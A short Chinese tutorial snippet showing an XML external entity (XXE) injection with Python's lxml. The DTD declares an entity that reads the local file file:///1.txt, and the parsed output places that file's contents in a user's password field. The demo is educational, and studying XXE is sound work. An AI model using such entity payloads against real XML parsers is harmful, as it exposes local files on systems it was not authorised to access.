# XML实体注入
主要用于演示XXE漏洞的原理,使用Python的lxml进行解析:

```
>>> from lxml import etree
>>> print(etree.tostring(etree.parse("users.xml"),pretty_print=True))
<!DOCTYPE users [
<!ENTITY % xxe SYSTEM "users.dtd">
<!ELEMENT users (user)+>
<!ELEMENT user (username , password , home_dir)>
<!ELEMENT username (#PCDATA)>
<!ELEMENT password (#PCDATA)>
<!ELEMENT home_dir (#PCDATA)>
<!ENTITY hack SYSTEM "file:///1.txt">
]>
<users>
        <user>
                <username>wangwu</username>
                <password>&#23494;&#30721;&#26159;123456</password>
                <home_dir>2222</home_dir>
        </user>
</users>
```

其中password部分为当前目录下`1.txt`中的内容。  